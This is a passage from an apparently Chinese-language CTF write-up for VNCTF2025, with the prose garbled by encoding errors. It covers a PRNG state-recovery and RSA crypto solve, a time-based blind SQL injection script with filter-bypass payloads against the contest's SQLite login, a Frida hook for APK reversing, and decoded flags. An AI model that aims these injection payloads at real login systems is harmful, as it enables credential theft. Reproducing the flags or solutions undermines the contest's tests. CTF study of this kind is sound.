function_">recoverState</span>(<span class="hljs-params">leak</span>):<br>    <span class="hljs-keyword">try</span>:<br>        x = m.solve_left(leak)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    x = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x])<br>    state = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>        tmp = <span class="hljs-built_in">int</span>(x[i * <span class="hljs-number">32</span>:(i + <span class="hljs-number">1</span>) * <span class="hljs-number">32</span>], <span class="hljs-number">2</span>)<br>        state.append(tmp)<br>    <span class="hljs-keyword">return</span> state<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backfirst</span>(<span class="hljs-params">state</span>):<br>    high = <span class="hljs-number">0x80000000</span><br>    low = <span class="hljs-number">0x7fffffff</span><br>    mask = <span class="hljs-number">0x9908b0df</span><br>    tmp = state[<span class="hljs-number">623</span>] ^ state[<span class="hljs-number">396</span>]<br>    <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>        tmp ^= mask<br>        tmp &lt;&lt;= <span class="hljs-number">1</span><br>        tmp |= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        tmp &lt;&lt;= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span> - <span class="hljs-number">1</span>) | tmp &amp; low, tmp &amp; low<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">leak</span>):<br>    state = recoverState(leak)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> state:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    L = [leak[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">120</span>)]<br>    prng = random.Random()<br>    guess1, guess2 = backfirst(state)<br>    <span class="hljs-built_in">print</span>(guess1, guess2)<br>    state[<span class="hljs-number">0</span>] = guess1<br>    s = state<br>    prng.setstate((<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(s + [<span class="hljs-number">0</span>]), <span class="hljs-literal">None</span>))<br>    g1 = [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> [prng.getrandbits(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">120</span>//<span class="hljs-number">8</span>)] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(z)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)]<br>    <span class="hljs-keyword">if</span> g1 == L:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;first&quot;</span>)<br>        prng.setstate((<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(s + [<span class="hljs-number">0</span>]), <span class="hljs-literal">None</span>))<br>        <span class="hljs-keyword">return</span> prng<br><br>    state[<span class="hljs-number">0</span>] = guess2<br>    s = state<br>    prng.setstate((<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(s + [<span class="hljs-number">0</span>]), <span class="hljs-literal">None</span>))<br>    g2 = [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> [prng.getrandbits(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">120</span>//<span class="hljs-number">8</span>)] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(z)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)]<br>    <span class="hljs-keyword">if</span> g2 == L:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;second&quot;</span>)<br>        prng.setstate((<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(s + [<span class="hljs-number">0</span>]), <span class="hljs-literal">None</span>))<br>        <span class="hljs-keyword">return</span> prng<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    length = <span class="hljs-number">19968</span><br>    prng = random.Random()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">37440</span>):<br>        prng.getrandbits(<span class="hljs-number">8</span>)<br>    originState = prng.getstate()<br>    leak = vector(GF(<span class="hljs-number">2</span>), [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> [prng.getrandbits(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length//<span class="hljs-number">8</span>)] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(z)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)])<br>    <span class="hljs-comment"># æ¢å¤state</span><br>    state = recoverState(leak)<br>    prng.setstate(originState)<br>    prng.getrandbits(<span class="hljs-number">8</span>)<br>    originState = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> prng.getstate()[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>]]<br>    <span class="hljs-keyword">assert</span> originState[<span class="hljs-number">1</span>:] == state[<span class="hljs-number">1</span>:]<br>    L = [leak[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">120</span>)]<br>    <span class="hljs-comment"># ä¸¤ç§å¯èƒ½</span><br>    guess1, guess2 = backfirst(state)<br>    <span class="hljs-built_in">print</span>(guess1, guess2)<br>    state[<span class="hljs-number">0</span>] = guess1<br>    s = state<br>    prng.setstate((<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(s + [<span class="hljs-number">0</span>]), <span class="hljs-literal">None</span>))<br>    g1 = [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> [prng.getrandbits(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">120</span>//<span class="hljs-number">8</span>)] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(z)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)]<br>    <span class="hljs-keyword">if</span> g1 == L:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;first&quot;</span>)<br>    state[<span class="hljs-number">0</span>] = guess2<br>    s = state<br>    prng.setstate((<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(s + [<span class="hljs-number">0</span>]), <span class="hljs-literal">None</span>))<br>    g2 = [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> [prng.getrandbits(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">120</span>//<span class="hljs-number">8</span>)] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(z)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)]<br>    <span class="hljs-keyword">if</span> g2 == L:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;second&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data_RC4.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read()<br>    lis = <span class="hljs-built_in">eval</span>(f)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)):<br>        randcrack = [i^<span class="hljs-number">17</span>^lis[j] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">37440</span>,<span class="hljs-number">37440</span>+<span class="hljs-number">2496</span>)]<br>        leak = vector(GF(<span class="hljs-number">2</span>), [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> randcrack <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(z)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)])<br>        prng = pwn(leak)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> prng:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">37440</span>,<span class="hljs-number">40000</span>):<br>            <span class="hljs-keyword">if</span> prng.getrandbits(<span class="hljs-number">8</span>)!=i^<span class="hljs-number">17</span>^lis[j]:<br>                <span class="hljs-built_in">print</span>(j)<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;crack!i=<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br>            p = nextprime(prng.getrandbits(<span class="hljs-number">512</span>))<br>            n = <span class="hljs-number">26980604887403283496573518645101009757918606698853458260144784342978772393393467159696674710328131884261355662514745622491261092465745269577290758714239679409012557118030398147480332081042210408218887341210447413254761345186067802391751122935097887010056608819272453816990951833451399957608884115252497940851</span><br>            e = <span class="hljs-number">65537</span><br>            encrypted_flag = <span class="hljs-number">22847144372366781807296364754215583869872051137564987029409815879189317730469949628642001732153066224531749269434313483657465708558426141747771243442436639562785183869683190497179323158809757566582076031163900773712582568942616829434508926165117919744857175079480357695183964845638413639130567108300906156467</span><br>            <span class="hljs-keyword">assert</span> n%p==<span class="hljs-number">0</span><br>            q = n//p<br>            phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>            d = invert(e,phi)<br>            m = <span class="hljs-built_in">pow</span>(encrypted_flag,d,n)<br>            <span class="hljs-built_in">print</span>(long_to_bytes(m))<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># test()</span><br>main()<br></code></pre></td></tr></table></figure> <img src="/img/VNCTF2025/VNCTF2025_7.png" alt="alt text" /></li><li>æ€»å…±è·‘äº†ä¸‰ä¸ªå°æ—¶æ‰æ‹¿åˆ°ç»“æœğŸ˜… <img src="/img/VNCTF2025/VNCTF2025_8.png" alt="alt text" /></li></ul><h1 id="web"><strong>Web</strong></h1><p>ä¸€å¤©çš„æ—¶é—´å¤ªç´§å¼ ï¼Œéƒ½æ²¡æ€ä¹ˆçœ‹å…¶ä»–webé¢˜ã€‚</p><h2 id="å¥¶é¾™å›å®¶">å¥¶é¾™å›å®¶</h2><ul><li>ç»å…¸çš„æ³¨å…¥æ¼æ´ï¼Œæ‰“å¼€ç½‘ç«™ç”¨burpsuitæŠ“åŒ…åä½¿ç”¨çˆ¬è™«å‘åŒ…ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">data = &#123; <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&quot;&quot;</span>&#125;<br>headers = &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>&#125;<br>response = requests.post(url, headers=headers, data=json.dumps(data))<br></code></pre></td></tr></table></figure></li><li>ä¸Šæ¥å…ˆ<code>' or 1=1#</code>èµ·æ‰‹ï¼Œé¦–å…ˆé¢˜ç›®è¿‡æ»¤äº†ç©ºæ ¼ç”¨<code>/**/</code>ç»•è¿‡ï¼Œå‘ç°å¯ä»¥å•å¼•å·é—­åˆå³æœ‰æ³¨å…¥å¯èƒ½ï¼Œä¸èƒ½ä½¿ç”¨<code>sleep</code>ç­‰å‡½æ•°ï¼›</li><li>ä¸€å¼€å§‹è¿˜æ˜¯å—æ€ç»´å®šå¼å½±å“ä¸€ç›´ä»¥ä¸ºæ˜¯MYSQLçš„æ³¨å…¥ï¼Œä½†æ˜¯ä½¿ç”¨<code>' or if(1,1,0)--</code>å’Œ<code>' or (database() like '%')--</code>æ•°æ®åº“ä¼šæŠ¥é”™ï¼Œæ‰§è¡Œ<code>' or sqlite_version()--</code>æˆåŠŸæ‰æ„è¯†åˆ°ä½œè€…ä½¿ç”¨çš„æ˜¯sqliteæ•°æ®åº“ï¼Œåœ¨è¿™å¡äº†åŠå¤©ğŸ« </li><li>sqliteæ³¨å…¥ä½¿ç”¨<code>randomblob(300000000)</code>ä»£æ›¿<code>sleep(1)</code>ï¼Œä½¿ç”¨<code>case</code>è¯­å¥è¿›è¡Œåˆ¤æ–­ä¾¿å¯æ‰§è¡Œæ—¶é—´ç›²æ³¨ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://node.vnteam.cn:47161/login&quot;</span><br>test = <span class="hljs-string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&#x27;</span><br><br>username = <span class="hljs-string">&quot;nailong&quot;</span><br>password = <span class="hljs-string">&quot;&quot;</span><br>idx = <span class="hljs-built_in">len</span>(password)+<span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(test)):<br>        time1 = time.time()<br>        <span class="hljs-comment"># payload = f&quot;substr((select/**/username/**/from/**/users),&#123;idx&#125;,1)&lt;&#x27;&#123;test[i]&#125;&#x27;&quot;</span><br>        payload = <span class="hljs-string">f&quot;substr((select/**/password/**/from/**/users),<span class="hljs-subst">&#123;idx&#125;</span>,1)&lt;&#x27;<span class="hljs-subst">&#123;test[i]&#125;</span>&#x27;&quot;</span><br>        data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">f&quot;&#x27;/**/or/**/case/**/when/**/<span class="hljs-subst">&#123;payload&#125;</span>/**/then/**/randomblob(300000000)/**/else/**/0/**/end--&quot;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&quot;&#x27;1&quot;</span><br>        &#125;<br>        headers = &#123;<br>            <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>        &#125;<br>        response = requests.post(url, headers=headers, data=json.dumps(data))<br>        time2 = time.time()<br><br>        <span class="hljs-comment"># print(json.loads(response.text))</span><br>        <span class="hljs-comment"># print(i,time2-time1)</span><br>        <span class="hljs-keyword">if</span> json.loads(response.text)[<span class="hljs-string">&#x27;message&#x27;</span>]!=<span class="hljs-string">&#x27;è´¦å·æˆ–å¯†ç é”™è¯¯ï¼ï¼&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(json.loads(response.text))<br>            exit()<br>        <span class="hljs-keyword">if</span> time2-time1&gt;<span class="hljs-number">0.5</span>:<br>            <span class="hljs-keyword">if</span> i!=<span class="hljs-number">0</span>:<br>                password+=test[i-<span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">else</span>:<br>                exit()<br>            <span class="hljs-built_in">print</span>(password)<br>            <span class="hljs-keyword">break</span><br>        time.sleep(<span class="hljs-number">0.4</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    idx+=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure> <img src="/img/VNCTF2025/VNCTF2025_9.png" alt="alt text" /></li><li>å¾—åˆ°ç”¨æˆ·åå¯†ç åæäº¤å¾—åˆ°è·³è½¬ç½‘é¡µè¿›è¡Œè®¿é—®ï¼š <img src="/img/VNCTF2025/VNCTF2025_10.png" alt="alt text" /> <img src="/img/VNCTF2025/VNCTF2025_11.png" alt="alt text" /></li></ul><h1 id="pwn"><strong>Pwn</strong></h1><div class="note note-danger">            <p>ä¸ä¼špwnä¸€ç‚¹ï¼</p>          </div><h1 id="misc"><strong>Misc</strong></h1><p>åªä¼šä¸€é“ç®€å•çš„ï¼Œå…¶ä»–çš„éƒ½å¥½éš¾ğŸ˜¶</p><h2 id="vn_lang">VN_Lang</h2><ul><li>æä¾›äº†ä¸€ä¸ªå°†æ–‡å­—è½¬åŒ–æˆç‰¹å®šç¬¦å·çš„è„šæœ¬ï¼Œä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯æ‰“è¡¨ï¼Œä½†æ˜¯ä»£ç æ²¡æä¾›æ¨¡æ¿ï¼Œäºæ˜¯ç”¨idaæ‰“å¼€ç¨‹åºæœç´¢å­—ç¬¦ä¸²<code>VNCTF</code>å¾—åˆ°flagï¼š <img src="/img/VNCTF2025/VNCTF2025_12.png" alt="alt text" /></li></ul><h1 id="reverse"><strong>Reverse</strong></h1><p>å¥½å¤šapké€†å‘é¢˜ç›®ã€‚ã€‚ã€‚</p><h2 id="hook-fish">Hook Fish</h2><ul><li>ä½¿ç”¨jadxå·¥å…·é€†å‘apkæ–‡ä»¶ï¼Œå®¡è®¡ä»£ç ï¼š <img src="/img/VNCTF2025/VNCTF2025_13.png" alt="alt text" /></li><li>ä»£ç é€»è¾‘æ˜¯è·å–ä¸€æ®µå£ä»¤å¹¶è¿›è¡ŒåŠ å¯†ï¼Œå†åœ¨æŸä¸ªç¥å¥‡çš„urlåœ°å€ä¸‹è½½<code>hook_fish.dex</code>å¹¶è½½å…¥å…¶ä¸­çš„åŠ å¯†å’Œæ£€æŸ¥æ–¹æ³•ï¼›</li><li>ä½¿ç”¨fridaè¿æ¥å¹¶hookå‡ºurlåœ°å€ï¼Œä¸‹è½½å¾—åˆ°æ–‡ä»¶ï¼š <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.example.hihitt.MainActivity&quot;</span>);<br>    <br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-property">fish</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">str</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] url input: &quot;</span> + str);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fish</span>(str);<br>    &#125;;<br>    <br>&#125;);<br></code></pre></td></tr></table></figure> <img src="/img/VNCTF2025/VNCTF2025_14.png" alt="alt text" /></li><li>ç»§ç»­åç¼–è¯‘<code>hook_fish.dex</code>æ–‡ä»¶ï¼Œæ»¡è¶³æ£€æŸ¥æ¡ä»¶ä¸¤æ¬¡è§£å¯†å¾—åˆ°å£ä»¤ï¼š <img src="/img/VNCTF2025/VNCTF2025_15.png" alt="alt text" /> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">fish_dcode = &#123;<br>    <span class="hljs-string">&quot;iiijj&quot;</span>: <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&quot;jjjii&quot;</span>: <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&quot;jijij&quot;</span>: <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&quot;jjijj&quot;</span>: <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&quot;jjjjj&quot;</span>: <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&quot;ijjjj&quot;</span>: <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&quot;jjjji&quot;</span>: <span class="hljs-string">&#x27;g&#x27;</span>,<br>    <span class="hljs-string">&quot;iijii&quot;</span>: <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&quot;ijiji&quot;</span>: <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&quot;iiiji&quot;</span>: <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&quot;jjjij&quot;</span>: <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&quot;jijji&quot;</span>: <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&quot;ijiij&quot;</span>: <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&quot;iijji&quot;</span>: <span class="hljs-string">&#x27;n&#x27;</span>,<br>    <span class="hljs-string">&quot;ijjij&quot;</span>: <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&quot;jiiji&quot;</span>: <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&quot;ijijj&quot;</span>: <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&quot;jijii&quot;</span>: <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&quot;iiiii&quot;</span>: <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&quot;jjiij&quot;</span>: <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&quot;ijjji&quot;</span>: <span class="hljs-string">&#x27;u&#x27;</span>,<br>    <span class="hljs-string">&quot;jiiij&quot;</span>: <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&quot;iiiij&quot;</span>: <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&quot;iijij&quot;</span>: <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&quot;jjiji&quot;</span>: <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&quot;jijjj&quot;</span>: <span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-string">&quot;iijjl&quot;</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&quot;iiilj&quot;</span>: <span class="hljs-string">&#x27;2&#x27;</span>,<br>    <span class="hljs-string">&quot;iliii&quot;</span>: <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&quot;jiili&quot;</span>: <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&quot;jilji&quot;</span>: <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&quot;iliji&quot;</span>: <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&quot;jjjlj&quot;</span>: <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&quot;ijljj&quot;</span>: <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&quot;iljji&quot;</span>: <span class="hljs-string">&#x27;9&#x27;</span>,<br>    <span class="hljs-string">&quot;jjjli&quot;</span>: <span class="hljs-string">&#x27;0&#x27;</span><br>&#125;<br><br>encrypted_str = <span class="hljs-string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">encrypted_str</span>):<br>    decoded_str = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(encrypted_str), <span class="hljs-number">5</span>):<br>        chunk = encrypted_str[i:i+<span class="hljs-number">5</span>]<br>        <span class="hljs-keyword">if</span> chunk <span class="hljs-keyword">in</span> fish_dcode:<br>            decoded_str.append(fish_dcode[chunk])<br>        <span class="hljs-keyword">else</span>:<br>            decoded_str.append(<span class="hljs-string">&#x27;?&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(decoded_str)<br><br>cipher = decode(encrypted_str)<br>tmp = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher)):<br>    tmp1 = <span class="hljs-built_in">ord</span>(cipher[i])-i%<span class="hljs-number">10</span>-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;7&#x27;</span>)<br>    tmp2 = <span class="hljs-built_in">ord</span>(cipher[i])-i%<span class="hljs-number">4</span>+<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    <span class="hljs-comment"># print(tmp1,tmp2)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;a&quot;</span>)&lt;=tmp2&lt;=<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;f&quot;</span>):<br>        tmp += <span class="hljs-built_in">chr</span>(tmp2)<br>    <span class="hljs-keyword">else</span>:<br>        tmp += <span class="hljs-built_in">chr</span>(tmp1)<br><br>newtmp = <span class="hljs-string">&quot;&quot;</span>.join(tmp[i+<span class="hljs-number">1</span>]+tmp[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(tmp),<span class="hljs-number">2</span>))<br>key = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(newtmp),<span class="hljs-number">2</span>):<br>    key+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(newtmp[i:i+<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">68</span>)<br><span class="hljs-built_in">print</span>(key)<br><span class="hljs-comment"># VNCTF&#123;u_re4l1y_kn0w_H0Ok_my_f1Sh!1l&#125;</span><br></code></pre></td></tr></table></figure></li></ul><h1 id="æ€»ç»“"><strong>æ€»ç»“</strong></h1><p>æ„Ÿè§‰ä¸€å¤©æ—¶é—´è¿˜æ˜¯å¤ªå°‘äº†ï¼Œå¾ˆå¤šapké€†å‘å’Œwebé¢˜ç›®è¿˜æ²¡ä»”ç»†çœ‹ï¼Œå¯èƒ½è¿˜æ˜¯å¤ªèœäº†ï¼ˆé›¾ï¼‰ï¼Œä¸è¿‡ä¹Ÿæ˜¯æƒŠé™©æŒ¤è¿›å‰åï¼Œæœ€åç­¾é€€éƒ½å¿˜è®°åšäº†ğŸ™ƒ</p><figure><img src="/img/VNCTF2025/VNCTF2025_16.png" alt="" /><figcaption>Final 